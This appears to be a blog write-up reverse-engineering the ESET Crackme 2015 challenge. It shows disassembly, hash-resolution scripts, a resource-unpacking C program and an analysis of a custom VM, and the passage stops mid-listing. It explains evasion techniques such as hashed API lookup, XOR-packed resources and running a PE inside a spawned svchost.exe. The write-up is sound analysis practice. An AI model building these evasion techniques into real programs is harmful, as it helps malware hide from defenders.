lpFilename\r.text:00402381 push 0 ; hModule\r.text:00402383 call GetModuleFileNameA\r.text:00402389 lea eax, [ebp+Filename]\r.text:0040238F lea ecx, [eax+1]\r.text:00402392\r.text:00402392 loc_402392: ; CODE XREF: start+55↓j\r.text:00402392 mov dl, [eax]\r.text:00402394 inc eax\r.text:00402395 test dl, dl\r.text:00402397 jnz short loc_402392\r.text:00402399 sub eax, ecx\r.text:0040239B mov [ebp+eax+var_105], 'l'\r.text:004023A3 lea eax, [ebp+eax+var_106]\r.text:004023AA mov word ptr [eax-1], 'ld'\r.text:004023B0 lea eax, [ebp+Filename]\r.text:004023B6 push eax ; lpLibFileName\r.text:004023B7 call LoadLibraryA\r.text:004023BD mov eset_dll, eax\rThe entry point is simple, it just loads EsetCrackme2015.dll\nNow in the DllEntryPoint we have\n.text:10000231 mov eax, large fs:30h\r.text:10000237 mov eax, [eax+0Ch]\r.text:1000023A mov eax, [eax+14h] ; InMemoryOrderModuleList\r.text:1000023D push esi\r.text:1000023E mov esi, eax\r.text:10000240 test eax, eax\r.text:10000242 jz loc_100002E2\r.text:10000248 push ebx\r.text:10000249 push edi\r.text:1000024A\r.text:1000024A loc_1000024A: ; CODE XREF: DllEntryPoint+6B↓j\r.text:1000024A mov ecx, [eax+28h] ; BaseDllName\r.text:1000024D test ecx, ecx\r.text:1000024F jz loc_100002E0\r.text:10000255 cmp word ptr [ecx], 0\r.text:10000259 mov edi, 811C9DC5h\r.text:1000025E jz short loc_1000028B\r.text:10000260\r.text:10000260 loc_10000260: ; CODE XREF: DllEntryPoint+5B↓j\r.text:10000260 mov dl, [ecx]\r.text:10000262 add ecx, 2\r.text:10000265 lea ebx, [edx-61h]\r.text:10000268 cmp bl, 19h\r.text:1000026B ja short loc_10000270\r.text:1000026D add dl, -20h\r.text:10000270\r.text:10000270 loc_10000270: ; CODE XREF: DllEntryPoint+45↑j\r.text:10000270 movsx edx, dl\r.text:10000273 xor edx, edi\r.text:10000275 imul edx, 1000193h\r.text:1000027B cmp word ptr [ecx], 0\r.text:1000027F mov edi, edx\r.text:10000281 jnz short loc_10000260\r.text:10000283 cmp edi, 0FC706866h\r.text:10000289 jz short loc_10000295\r.text:1000028B\r.text:1000028B loc_1000028B: ; CODE XREF: DllEntryPoint+38↑j\r.text:1000028B mov esi, [esi]\r.text:1000028D mov eax, [esi]\r.text:1000028F test eax, eax\r.text:10000291 jnz short loc_1000024A\rIt searches through the list of loaded modules for the hash 0FC706866h which happens to be EsetCrackme2015.exe. The hash algorithm used is\n# fnv hash def hash16(name): ans = 0x811c9dc5 for i in name: ans = (ans^ord(i.upper()))*0x1000193 \u0026amp; 0xffffffff return ans .text:10000295 mov eax, [eax+10h] ; BaseAddress\r.text:10000298 test eax, eax\r.text:1000029A jz short loc_100002E0\r.text:1000029C mov ecx, 1000h\r.text:100002A1 mov edx, 1010101h\r.text:100002A6\r.text:100002A6 loc_100002A6: ; CODE XREF: DllEntryPoint+B0↓j\r.text:100002A6 mov esi, [ecx+eax]\r.text:100002A9 add esi, edx\r.text:100002AB cmp esi, 0FB131506h\r.text:100002B1 jnz short loc_100002CF\r.text:100002B3 mov esi, [ecx+eax+4]\r.text:100002B7 add esi, edx\r.text:100002B9 cmp esi, 20C16ADFh\r.text:100002BF jnz short loc_100002CF\r.text:100002C1 mov esi, [ecx+eax+8]\r.text:100002C5 add esi, edx\r.text:100002C7 cmp esi, 0C43360A2h\r.text:100002CD jz short loc_100002DA\r.text:100002CF\r.text:100002CF loc_100002CF: ; CODE XREF: DllEntryPoint+8B↑j\r.text:100002CF ; DllEntryPoint+99↑j\r.text:100002CF inc ecx\r.text:100002D0 cmp ecx, 2F00h\r.text:100002D6 jb short loc_100002A6\r.text:100002D8 jmp short loc_100002E0\r.text:100002DA ; ---------------------------------------------------------------------------\r.text:100002DA\r.text:100002DA loc_100002DA: ; CODE XREF: DllEntryPoint+A7↑j\r.text:100002DA lea eax, [ecx+eax+0Ch]\r.text:100002DE call eax\rSo, it finds the address of the following sequence of bytes in EsetCrackme2015.exe\n05 14 12 fa de 69 c0 1f a1 5f 32 c3​, which happens to be\n.text:00401E93 add eax, 0DEFA1214h\r.text:00401E98 imul eax, 325FA11Fh\r.text:00401E9E retn\rSo, the real entry point is 0x401e93+0xc = 0x401e9f\nI\u0026rsquo;ve renamed the real entry point as Main\n.text:00401E9F Main proc near\r.text:00401E9F push edi\r.text:00401EA0 xor edi, edi\r.text:00401EA2 cmp zero, edi\r.text:00401EA8 jz short loc_401ED9\r.text:00401EAA push esi\r.text:00401EAB call getKernel32\r.text:00401EB0 mov esi, eax\r.text:00401EB2 push Sleep ; Sleep\r.text:00401EB7 call resolve_export_hash\r.text:00401EBC push edi\r.text:00401EBD push edi\r.text:00401EBE push eax\r.text:00401EBF push offset Thread1_Proc\r.text:00401EC4 push edi\r.text:00401EC5 push edi\r.text:00401EC6 push CreateThread ; CreateThread\r.text:00401ECB mov zero, edi\r.text:00401ED1 call resolve_export_hash\r.text:00401ED6 call eax\r.text:00401ED8 pop esi\r.text:00401ED9\r.text:00401ED9 loc_401ED9: ; CODE XREF: Main+9↑j\r.text:00401ED9 pop edi\r.text:00401EDA retn\r.text:00401EDA Main endp\r;\r; ...\r;\r.text:0040101C Name db 'EsetCrackme2015',0 ; DATA XREF: start+9↓o\r.text:0040102C eset_dll dd 0CCCCCCCCh ; DATA XREF: start+7B↓w\r.text:00401030 zero dd 0ED174512h\rHere\u0026rsquo;s a small IDAPython script to rename imported hashes\ndef hashIt(name): ans = 0x811c9dc5 for ch in name: ans = (ans ^ ord(ch)) * 0x1000193 \u0026amp; 0xffffffff return ans x = AddEnum(-1, \u0026#34;Global\u0026#34;, idaapi.decflag()) names = open(\u0026#34;kernel_user32.txt\u0026#34;).read().split() for name in names: AddConstEx(x, name, hashIt(name), -1) where kernel_user32.txt contains a list of kernel32+user32 exports\nresolve_export_hash uses hash16 algorithm to find a function, given a hash, from the export table of the module base in esi. Thread1_Proc calls sub_40213B with eax pointing to EsetCrackme2015.dll\u0026rsquo;s base address.\nThe routine sub_40213B is interesting. It sets up a data structure at ebp-0x138\n   Offset Description     +0 Base address of EsetCrackme2015.dll   +4 EsetCrackme2015_dll.SizeofImage   +8 128 words initialized to 0 (Marked Array), Initially Unmarked   +0x108 bStopProcessing (initially 0)   +0x109 bResourcesLoaded (initially 0)   +0x10b dwTagToExtract (initially 1)   +0x10d Handle returned by CreateEvent   +0x111 _resolve_export   +0x115 xor_string   +0x119 unpack_pe   +0x11d unpack_pe_key (“SXJyZW4lMjBpc3QlMjBtZW5zY2hsaWNo”)   +0x121 hPipe (\u0026quot;\\.\\pipe\\EsetCrackmePipe\u0026quot;)    .text:004021E8 push 101h\r.text:004021ED mov [esi+125h], eax\r.text:004021F3 mov dword ptr [esi+115h], offset xor_string\r.text:004021FD mov dword ptr [esi+111h], offset _resolve_export\r.text:00402207 mov [esi+108h], bl\r.text:0040220D call _lookup_tag\r.text:00402212 push 3\r.text:00402214 mov edi, eax\r.text:00402216 call _lookup_tag\r.text:0040221B pop ecx\r.text:0040221C pop ecx\r.text:0040221D cmp edi, ebx\r.text:0040221F jz loc_4022D5\r.text:00402225 cmp eax, ebx\r.text:00402227 jz loc_4022D5\rHere the binary loads some resources with id\u0026rsquo;s 3 and 0x101. The resources have the following layout\nstruct resource_t { uint16_t tag; uint32_t size; uint8_t data[]; }; .text:0040222D mov edx, [ebp+hKernel32]\r.text:00402230 push 20h\r.text:00402232 add edx, 4Dh\r.text:00402235 push edx\r.text:00402236 push dword ptr [eax+2]\r.text:00402239 lea ecx, [eax+6]\r.text:0040223C push ecx\r.text:0040223D mov [ebp+pe], ecx\r.text:00402240 call xor_string\r.text:00402245 mov eax, [ebp+pe]\r.text:00402248 push eax\r.text:00402249 mov [esi+11Dh], eax\r.text:0040224F push dword ptr [edi+2]\r.text:00402252 lea esi, [edi+6]\r.text:00402255 push esi\r.text:00402256 call unpack_pe\r.text:0040225B push esi\r.text:0040225C push esi\r.text:0040225D call relocate_pe\r.text:00402262 mov eax, [edi+406h]\r.text:00402268 add esp, 24h\r.text:0040226B mov [ebp+pe], eax\rFrom this code, its certain that resource 0x151 is a PE file and resource 3 is the key for unpacking the PE file.\nvoid xor_string(char* buf, int size, char* str, int len) { for (i = 0; i \u0026lt; size; ++i) buf[i] ^= str[i%len]; } The resource with id 3 is decoded with the above algorithm, by passing 32 for len and \u0026ldquo;!This program cannot be run in DOS mode.\u0026rdquo; for str.\nSo, resource with id 3 contains SXJyZW4lMjBpc3QlMjBtZW5zY2hsaWNo​ which is base64 of ​escape(\u0026quot;Irren ist menschlich\u0026quot;)​. The address of the data is stored in [ebp-0x1B]\nFinally the thread calls [ebp+pe] in a loop, with a single argument to ecx which is the address of the data structure (ebp-0x138)\n.text:00402270 loc_402270: ; CODE XREF: sub_40213B+14D↓j\r.text:00402270 ; sub_40213B+198↓j\r.text:00402270 pushaw\r.text:00402272 mov ecx, ebp_138h\r.text:00402278 call [ebp+pe]\r.text:0040227B movzx eax, ax\r.text:0040227E mov [ebp+hKernel32], eax\r.text:00402281 popaw\r.text:00402283 xor ebx, ebx\r.text:00402285 cmp [ebp+hKernel32], ebx\r.text:00402288 jnz short loc_402270\r.text:0040228A mov esi, ebp_138h\r.text:00402290 cmp [esi+108h], bl\r.text:00402296 jnz short loc_4022D5\r.text:00402298 push 0FFFFFFFFh\r.text:0040229A push dword ptr [esi+10Dh]\r.text:004022A0 xor eax, eax\r.text:004022A2 mov [esi+10Bh], ax\r.text:004022A9 mov esi, [esi+129h]\r.text:004022AF sub esi, 54ED3267h\r.text:004022B5 push WaitForSingleObject\r.text:004022BA xor esi, 0AB12CD99h\r.text:004022C0 call resolve_export_hash\r.text:004022C5 call eax\r.text:004022C7\r.text:004022C7 loc_4022C7: ; CODE XREF: sub_40213B+133↑j\r.text:004022C7 mov esi, ebp_138h\r.text:004022CD cmp [esi+108h], bl\r.text:004022D3 jz short loc_402270\rLet’s take a look at the function executed by Thread 2 at 0x0401F13. Let’s call it Thread2_Proc.\n.text:00401F19 push 2\r.text:00401F1B call _lookup_tag\r.text:00401F20 pop ecx\r.text:00401F21 test eax, eax\r.text:00401F23 jnz short loc_401F2D\r.text:00401F25 or eax, 0FFFFFFFFh\r.text:00401F28 jmp locret_402099\r.text:00401F2D ; ---------------------------------------------------------------------------\r.text:00401F2D\r.text:00401F2D loc_401F2D: ; CODE XREF: Thread2_Proc+10↑j\r.text:00401F2D mov [ebp+var_4], 223F043Eh\r.text:00401F34 add [ebp+var_4], 23114512h ; \u0026quot;PIPE\u0026quot;\r.text:00401F3B push 4\r.text:00401F3D lea edx, [ebp+var_4]\r.text:00401F40 push edx\r.text:00401F41 push dword ptr [eax+2]\r.text:00401F44 lea ecx, [eax+6]\r.text:00401F47 push ecx\r.text:00401F48 mov [ebp+szPipeName], ecx\r.text:00401F4B call xor_string\rCool. So resource 2 contains the pipe path, xor encoded using the string \u0026quot;PIPE\u0026quot;.\n.text:00401F50 mov eax, ebp_138h\r.text:00401F55 add esp, 10h\r.text:00401F58 cmp byte ptr [eax+108h], 0\r.text:00401F5F jnz loc_402097\r.text:00401F65 push ebx\r.text:00401F66 push esi\r.text:00401F67 push edi\r.text:00401F68 mov ebx, 54ED3267h\r.text:00401F6D mov edi, 0AB12CD99h\r.text:00401F72\r.text:00401F72 loc_401F72: ; CODE XREF: Thread2_Proc+17B↓j\r.text:00401F72 mov esi, [eax+129h]\r.text:00401F78 xor edx, edx\r.text:00401F7A push edx\r.text:00401F7B push edx\r.text:00401F7C mov ecx, 200h\r.text:00401F81 push ecx\r.text:00401F82 push ecx\r.text:00401F83 push 0FFh\r.text:00401F88 push edx\r.text:00401F89 push 3\r.text:00401F8B push [ebp+szPipeName] ; \u0026quot;\\\\.\\pipe\\EsetCrackmePipe\u0026quot;\r.text:00401F8E sub esi, ebx\r.text:00401F90 push CreateNamedPipeA\r.text:00401F95 xor esi, edi\r.text:00401F97 call resolve_export_hash\r.text:00401F9C call eax\rSo, it creates a named pipe \u0026ldquo;\\.\\pipe\\EsetCrackmePipe\u0026rdquo;\n.text:00401FEE lea eax, [ebp+b1]\r.text:00401FF1 push eax ; buffer\r.text:00401FF2 push 1 ; size\r.text:00401FF4 call read_pipe\r.text:00401FF9 lea eax, [ebp+b2]\r.text:00401FFC push eax ; buffer\r.text:00401FFD push 2 ; size\r.text:00401FFF call read_pipe\r.text:00402004 push dword ptr [ebp+b2]\r.text:00402007 push dword ptr [ebp+b1]\r.text:0040200A call process\r.text:0040200F mov eax, ebp_138h\r.text:00402014 mov esi, [eax+129h]\r.text:0040201A add esp, 18h\r.text:0040201D push dword ptr [eax+121h]\r.text:00402023 sub esi, ebx\r.text:00402025 push FlushFileBuffers\r.text:0040202A xor esi, edi\r.text:0040202C call resolve_export_hash\r.text:00402031 call eax\r.text:00402033 mov eax, ebp_138h\r.text:00402038 mov esi, [eax+129h]\r.text:0040203E push dword ptr [eax+121h]\r.text:00402044 sub esi, ebx\r.text:00402046 push DisconnectNamedPipe\r.text:0040204B xor esi, edi\r.text:0040204D call resolve_export_hash\r.text:00402052 call eax\rIt reads a byte followed by a int16 and then processes it. This is repeated while bStopProcessing is 0.\n.text:00401E1C lea eax, [ebp+b1]\r.text:00401E1F push eax ; buffer\r.text:00401E20 push 1 ; size\r.text:00401E22 call write_pipe\r.text:00401E27 lea eax, [ebp+b2]\r.text:00401E2A push eax ; buffer\r.text:00401E2B push 2 ; size\r.text:00401E2D call write_pipe\r.text:00401E32 add esp, 10h\r.text:00401E35 cmp [ebp+b1], 1\r.text:00401E39 jnz short loc_401E65\r.text:00401E3B push [ebp+b2]\r.text:00401E3E call _lookup_tag\r.text:00401E43 mov edi, eax\r.text:00401E45 pop ecx\r.text:00401E46 test edi, edi\r.text:00401E48 jz short loc_401E87\r.text:00401E4A lea esi, [edi+2]\r.text:00401E4D push esi ; buffer\r.text:00401E4E push 4 ; size\r.text:00401E50 call write_pipe\r.text:00401E55 add edi, 6\r.text:00401E58 push edi ; buffer\r.text:00401E59 push dword ptr [esi] ; size\r.text:00401E5B call write_pipe\r.text:00401E60 add esp, 10h\r.text:00401E63 jmp short loc_401E8F\r.text:00401E65 ; ---------------------------------------------------------------------------\r.text:00401E65\r.text:00401E65 loc_401E65: ; CODE XREF: process+22↑j\r.text:00401E65 cmp [ebp+b1], 2\r.text:00401E69 jnz short loc_401E77\r.text:00401E6B mov esi, [ebp+b2]\r.text:00401E6E call _mark\r.text:00401E73\r.text:00401E73 loc_401E73: ; CODE XREF: process+6E↓j\r.text:00401E73 push 0\r.text:00401E75 jmp short loc_401E89\r.text:00401E77 ; ---------------------------------------------------------------------------\r.text:00401E77\r.text:00401E77 loc_401E77: ; CODE XREF: process+52↑j\r.text:00401E77 cmp [ebp+b1], 3\r.text:00401E7B jnz short loc_401E87\r.text:00401E7D mov esi, [ebp+b2]\r.text:00401E80 call _clear_mark\rSo, process writes the bytes into the pipe in the order they were read. The first byte can take three values only - 1, 2 and 3.\n Lookup tag whose id is the next two bytes and write the resource preceded by its length Mark tag of the given 2 byte id (in the marked array, at offset +8 wrt ebp-0x138) Clear marked tag  Extracting Resources Here\u0026rsquo;s a small C program to extract the resources\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;windows.h\u0026gt; typedef void (*FUNC) (void*, DWORD, char*); char g_szKey[] = \u0026#34;SXJyZW4lMjBpc3QlMjBtZW5zY2hsaWNo\u0026#34;; char* lookup(void* hDll, short tag) { char* ptr = (char*) hDll; while (*(short*)(ptr) != tag) { ptr += 6+*(int*)(ptr+2); } return ptr; } int main(int argc, char** argv) { if (argc == 1) { printf(\u0026#34;Usage: %s [tag bUnpack? file_name]*\\n\u0026#34;, argv[0]); exit(0); } HMODULE hExe = LoadLibrary(\u0026#34;EsetCrackme2015.exe\u0026#34;); HMODULE hDll = LoadLibraryEx(\u0026#34;EsetCrackme2015.dll\u0026#34;, NULL, 1); FUNC unpackMe = (FUNC) ((char*) hExe + 0x1000 + 0xd11 - 0x200); for (char** p = argv; *++p; p += 2) { short m_tag; sscanf(p[0], \u0026#34;%hi\u0026#34;, \u0026amp;m_tag); char* tag = lookup(hDll, m_tag); if (p[1][0] == \u0026#39;1\u0026#39;) unpackMe(tag+6, *(DWORD*)(tag+2), g_szKey); FILE* dp = fopen(p[2], \u0026#34;wb\u0026#34;); fwrite(tag+6, 1, *(DWORD*)(tag+2), dp); fclose(dp); } } Resource 0x101 .text:004009A9 push ebp\r.text:004009AA mov ebp, esp\r.text:004009AC sub esp, 104h\r.text:004009B2 push esi\r.text:004009B3 mov esi, ecx\r.text:004009B5 mov ebp_138h, esi\r.text:004009BB call is_initialized?\r.text:004009C0 test al, al\r.text:004009C2 jz short loc_4009CE\r.text:004009C4 call LoadResources\r.text:004009C9 jmp loc_400BA5\r.text:004009CE ; ---------------------------------------------------------------------------\r.text:004009CE\r.text:004009CE loc_4009CE: ; CODE XREF: sub_4009A9+19↑j\r.text:004009CE call has_all_extracted?\r.text:004009D3 test al, al\r.text:004009D5 jz short loc_4009E1\r.text:004009D7 call FreeResources\r.text:004009DC jmp loc_400BA5\rLoadResources fetches resources - 0x102, 0x103 and 0x104\n.text:004009E1 push 0BB01h\r.text:004009E6 call is_marked?\r.text:004009EB pop ecx\r.text:004009EC test al, al\r.text:004009EE jz loc_400A75\r.text:004009F4 push 0BB02h\r.text:004009F9 call is_marked?\r.text:004009FE pop ecx\r.text:004009FF test al, al\r.text:00400A01 jz short loc_400A75\r.text:00400A03 push 0BB03h\r.text:00400A08 call is_marked?\r.text:00400A0D pop ecx\r.text:00400A0E test al, al\r.text:00400A10 jz short loc_400A75\r.text:00400A12 push 0FF01h\r.text:00400A17 call is_marked?\r.text:00400A1C pop ecx\r.text:00400A1D test al, al\r.text:00400A1F jz short loc_400A75\r.text:00400A21 push offset aUser32Dll ; \u0026quot;user32.dll\u0026quot;\r.text:00400A26 push LoadLibraryA\r.text:00400A2B call dword ptr [esi+111h]\r.text:00400A31 call eax\r.text:00400A33 push 40h\r.text:00400A35 push offset aInfo ; \u0026quot;Info\u0026quot;\r.text:00400A3A push offset aThatsAllCongra ; \u0026quot;Thats all. Congratulations!\u0026quot;\r.text:00400A3F push 0\r.text:00400A41 push offset aMessageboxa ; \u0026quot;MessageBoxA\u0026quot;\r.text:00400A46 push eax\r.text:00400A47 mov eax, ebp_138h\r.text:00400A4C push GetProcAddress\r.text:00400A51 call dword ptr [eax+111h]\r.text:00400A57 call eax\r.text:00400A59 call eax\r.text:00400A5B mov ecx, ebp_138h\r.text:00400A61 mov eax, 0FFFFh\r.text:00400A66 mov [ecx+10Bh], ax ; mark finished\rSo, resources 0xbb01, 0xbb02, 0xbb03 and 0xff01 must be marked to complete the entire challenge. Initially none of these are marked.\nAlso, dwTagToExtract is 1. So the following code is executed\n.text:00400AA8 mov esi, offset aSvchostExe ; \u0026quot;\\\\svchost.exe\u0026quot;\r.text:00400AAD movsd\r.text:00400AAE movsd\r.text:00400AAF movsd\r.text:00400AB0 lea eax, [ebp+szSystem32Path]\r.text:00400AB6 push eax\r.text:00400AB7 movsb\r.text:00400AB8 call spawn_svchost\r.text:00400ABD mov esi, ebp_138h\r.text:00400AC3 pop ecx\r.text:00400AC4 push 2\r.text:00400AC6 pop eax\r.text:00400AC7 mov [esi+109h], ax\ra RunPE technique is used to execute the PE file, resource 0x151.\nIf dwTagToExtract is 0xbb01, then drv.zip is extracted\n.text:00400ADC push 1\r.text:00400ADE push offset aDrvZip ; \u0026quot;drv.zip\u0026quot;\r.text:00400AE3 mov eax, 152h\r.text:00400AE8 call extract_resource\rIf dwTagToExtract is 0xaa01, then PuncherMachine and PunchCardReader are extracted\n.text:00400B11 push 1\r.text:00400B13 push offset aPunchcardreade ; \u0026quot;PunchCardReader.exe\u0026quot;\r.text:00400B18 mov eax, 154h\r.text:00400B1D call extract_resource\r.text:00400B22 push 1\r.text:00400B24 push offset aPunchermachine ; \u0026quot;PuncherMachine.exe\u0026quot;\r.text:00400B29 mov eax, 153h\r.text:00400B2E call extract_resource\r.text:00400B33 push 1 ; bUnpack\r.text:00400B35 push 4 ; \u0026quot;\\\\?\\GLOBALROOT\\Device\\45736574\\\u0026quot;\r.text:00400B37 call get_resource\rResource 0x102 - A Virtual Machine Here is my analysis of the resource 0x102.\nldr(type, index, size) if type == 0:\rif size == 0:\rreturn (byte) regs[index]\relif size == 1:\rreturn (word) regs[index]\relse:\rreturn (dword) regs[index]\relif type == 1:\rif size == 0:\rreturn *(byte*) regs[index]\relif size == 1:\rreturn *(word*) regs[index]\relse:\rreturn *(dword*) regs[index]\relif type == 2:\rif size == 0:\rreturn _get_int8()\relif size == 1:\rreturn _get_int16()\relse:\rreturn _get_int32()\relif type == 3:\rreturn vm[0x45a] + _get_int32()\rstr(type,size,data,index) if type == 1:\rregs[index] = data\relif type == 2:\rssize = size == 0 ? 'byte' : size == 1 ? 'word' : 'dword'\r*([ssize]*) regs[index] = data\rcall() o = read1()\rfn = ldr(o.type, o.index, 2)\rsesp = esp\resp = stack_top\rcall fn(eax=regs[0])\rstack_top=esp\resp = sesp\rregs[0]=eax\rCALL_STDLIB() o = read2()\riFnHash = ldr(o.ldr_type, o.str_index, 2)\riModHash = ldr(o.str_type, o.ldr_index, 2)\rif o.ldr_type == 3:\riFnHash = *(dword) iFnHash\rif o.str_type == 3:\riModHash = *(dword) iModHash\rif iModHash == 0:\rhModBase = vm[0x409]\relse:\rhModBase = ResolveModule(iModHash)\rif hModBase == 0:\rhModBase = _probably_LoadModule(iModHash)\rfn = ResolveExport(hModBase, iFnHash)\rsesp = esp\resp = stack_top\rcall fn(eax=regs[0])\rstack_top=esp\resp = sesp\rregs[0]=eax\rPUSH() o = read1()\rdata = ldr(o.type, o.index, o.word_size)\rvm.stack.push(data)\rPOP_REG() o = read1()\rregs[o.index] = pop()\rCMP() o = read2()\rd = ldr(o.ldr_type, o.ldr_index, o.str_type)\rr = regs[o.str_index]\rif o.word_size == 0:\rvm.flags = r == d\relif o.word_size == 1:\rvm.flags = r != d\relif o.word_size == 2:\rvm.flags = r \u0026gt;= d\rJMP() o = read1()\rd = ldr(2, 0, 2)\rif o == 0:\rvm.next_insn_offset = d\relif o == 1:\rif vm.flags:\rvm.flags = 0\rvm.next_insn_offset = d\rCALL_VM() d = ldr(2, 0, 2)\rvm.stack.push(vm.next_insn_offset)\rvm.next_insn_offset = d\rRET_VM() vm.next_insn_offset = vm.stack.pop()\rALU() o = read2()\rd = ldr(o.ldr_type, o.ldr_index, o.str_type)\rif o.word_size == 0:\rregs[o.str_index] ^= d\relif o.word_size == 1:\rregs[o.str_index] += d\relif o.word_size == 2:\rregs[o.str_index] -= d\relif o.word_size == 3:\rregs[o.str_index] \u0026lt;\u0026lt;= d\relif o.word_size == 4:\rregs[o.str_index] \u0026gt;\u0026gt;= d\relif o.word_size == 5:\rrol = lambda a, b, c: a\u0026lt;\u0026lt;b|a\u0026gt;\u0026gt;8*c-b\rregs[o.str_index] = rol(regs[o.str_index], d, 2**o.str_type)\relif o.word_size == 6:\rror = lambda a, b, c: a\u0026lt;\u0026lt;b|a\u0026gt;\u0026gt;8*c-b\rregs[o.str_index] = ror(regs[o.str_index], d, 2**o.str_type)\relif o.word_size == 7:\rregs[o.str_index] %= d\rMALLOC() o = read1()\rd = ldr(o.type, o.index, o.word_size)\rregs[0] = VirtualAlloc(size=d, flags=0x40)\rFREE() o = read1()\rd = ldr(o.type, o.index, o.word_size)\rfree(d)\rEMULATE() o = read2()\rd1 = ldr(o.ldr_type, o.str_index, 2)\rd2 = ldr(o.str_type, o.ldr_index, o.word_size)\rmem = alloc(size=d2\u0026lt;\u0026lt;2, flags=0x40)\rfor i in xrange(d2):\rmem[i] = vm.stack.pop()\rvm2 = {}\rvm2.init()\rvm2.run(d1, vm.kernel32, d2, mem)\rvm2.free()\rRunVM(lpRes, hModule, nElem, lpArray)\r{\rif (hModule || vm.bModuleLoaded)\rvm.hModule = hModule\relse\rvm.hModule = ResolveModule(\u0026quot;kernel32\u0026quot;)\rmem = alloc(lpRes.size, flags=0x40)\rmemcpy(mem, lpRes, lpRes.size)\rvm[0x45a] = mem+[lpRes+6]\rvm[0x3fd] = mem\rvm[0x401] = lpRes.size\rvm.insn_base = mem+0x12\rstk = alloc(0x400000, flags=4)\rif (vm.stack_base)\rfree(vm.stack_base)\rvm.stack_base = stk\rvm.stack_top = stk+4*0xfffff\rmemset(vm.regs, 0, 0x10*4)\rvm.regs[6] = vm.stack_top\rvm.regs[7] = vm[0x3fd]\rvm.regs[8] = vm[0x401]\rvm.regs[9] = vm.hModule\rfor i in xrange(vm.nArgs):\rvm.regs[i+10] = vm.lpArgs[i]\rif (lpRes.sign != 0x1337)\rLoopVM() // decrypt vm code\rvm.insn_base = \u0026amp;lpResource.code_offset\rReturn LoopVM()\r}\rLoopVM()\r{\rvm.insn_base = lpRes.insn_base\rwhile (vm.bRunning)\r{\rvm.func[_get_byte()]()\r}\rreturn vm.regs[0]\r}\rVM Layout    Offset Function Pointer     +0 STOP   +4 MOV   +8 CALL   +0xc CALL_STDLIB   +0x10 PUSH   +0x14 POP_REG   +0x20 CMP   +0x24 JMP   +0x28 CALL_VM   +0x28 RET_VM   +0x30 ALU   +0x34 MALLOC   +0x38 FREE   +0x40 EMULATE   +0x44 STOP   \u0026hellip; \u0026hellip;   +0x3f8 STOP   +0x3fc bRunning   +0x3fd lpResource   +0x401 lpResource.size   +0x405 bModuleLoaded? ([lpResource+0xe])   +0x409 hModule (kernel32)   +0x40d nArgs   +0x411 lpArgs   +0x415 flags   +0x416 regs   +0x42e stack_top   +0x456 insn_base   +0x45a data_base   +0x45e next_insn_offset   +0x462 stack_top   +0x466 stack_base    Instruction Encoding struct insn8 { unsigned index: 4; unsigned type: 2; unsigned word_size:2; }; struct insn16 { unsigned str_index: 4; unsigned ldr_index: 4; unsigned ldr_type: 2; unsigned str_type: 2; unsigned word_size: 3; unsigned __pad:1; }; File Layout (0x102)    Offset Data     +0 signature   +2 code_offset   +6 data_offset   +0xa size   +0xe bModuleLoaded?    If signature is not 0x1337, then code is encrypted, which must be decrypted using the signature as the xor key. Let’s look at the disassembly of resource 0x103.\n00 ldr X, R7 str X, R0 03 ldr X, byte ptr [R0] str X, R1 06 ldr X, 0x1 add R0, X 0a ldr X, byte ptr [R0] str X, R2 0d ldr X, 0x1 add R0, X 11 ldr X, dword ptr [R0] str X, R3 14 ldr X, R8 str X, R0 17 ldr X, R7 add R0, X 1a ldr X, R7 add R3, X 1d ldr X, byte ptr [R3] str X, R4 20 ldr X, R1 xor R4, X 23 ldr X, R2 add R1, X 26 ldr X, R4 str X, byte ptr [R3] 29 ldr X, 0x1 add R3, X 2d ldr X, R0 cmp.ge X, R3 30 ldr X, 0x1d jmp.cc X 36 ldr X, R7 str X, R0 39 ldr X, 0x37 str X, byte ptr [R0] 3d ldr X, 0x1 add R0, X 41 ldr X, 0x13 str X, byte ptr [R0] 45 hlt\rYeah, it\u0026rsquo;s a xor encryption\nkey = b.sign[0] incr = b.sign[1] for i in xrange(b.code_offset, b.code_offset+b.size): b[i] = (b[i]^key) + incr \u0026amp; 0xff Resource 0x151 .text:004019FB mov eax, 0DF09C20Dh\r.text:00401A00 mov esi, [ebp+hWnd]\r.text:00401A03 mov ecx, offset dword_412EF0\r.text:00401A08 mov hWnd, esi\r.text:00401A0E call initialize\r.text:00401A13 lea ecx, [ebp+uMsg]\r.text:00401A16 push ecx ; lpThreadId\r.text:00401A17 push 0 ; dwCreationFlags\r.text:00401A19 push offset dword_412EF0 ; lpParameter\r.text:00401A1E push offset StartAddress ; lpStartAddress\r.text:00401A23 push 0 ; dwStackSize\r.text:00401A25 push 0 ; lpThreadAttributes\r.text:00401A27 call ds:CreateThread\r.text:00401A2D mov hDlg, esi\r.text:00401A33 call AcquireDebugPriv\r.text:00401A38 call GetResource\rThe function GetResource fetches resources 0xbb01 and 0xbb02. 0xbb01 is xor encrypted using \u0026ldquo;PIPE\u0026rdquo;. Decoding gives three sha160 hashes.\ninitialize initializes dword_412EF0 with _resolve_sha1 and dword_412EF4 with LoadLibraryA.\n.text:0040228A mov eax, [ebp+var_10]\r.text:0040228D mov eax, [eax]\r.text:0040228F mov ecx, [edi+8]\r.text:00402292 push 0\r.text:00402294 push eax\r.text:00402295 push 0\r.text:00402297 push ecx\r.text:00402298 call ebx\r.text:0040229A push offset Edit_Handler\r.text:0040229F push GWLP_WNDPROC\r.text:004022A1 push eax\r.text:004022A2 mov _loadLib_sha1, edi\r.text:004022A8 call esi ; SetWindowLong\r.text:004022AA mov [edi+0Ch], eax\r;\r; ....\r;\r.text:004022ED push offset lstrcmpA\r.text:004022F2 push eax\r.text:004022F3 call ecx\r.text:004022F5 mov edx, [edi+4]\r.text:004022F8 push eax\r.text:004022F9 call edx\r.text:004022FB jmp short loc_4022FF\r.text:004022FD ; ---------------------------------------------------------------------------\r.text:004022FD\r.text:004022FD loc_4022FD: ; CODE XREF: sub_402170+175↑j\r.text:004022FD ; sub_402170+17B↑j\r.text:004022FD xor eax, eax\r.text:004022FF\r.text:004022FF loc_4022FF: ; CODE XREF: sub_402170+18B↑j\r.text:004022FF mov [edi+114h], eax ; lstrcmpA\rHere the message handler for the first text box is changed to Edit_Handler. Let\u0026rsquo;s see what Edit_Handler does\n.text:004023EC mov ecx, eax\r.text:004023EE call base64_size\r.text:004023F3 mov edi, eax\r.text:004023F5 push edi ; size_t\r.text:004023F6 call operator new(uint)\r.text:004023FB add esp, 4\r.text:004023FE push ebx\r.text:004023FF lea ecx, [ebp+szInput]\r.text:00402402 mov 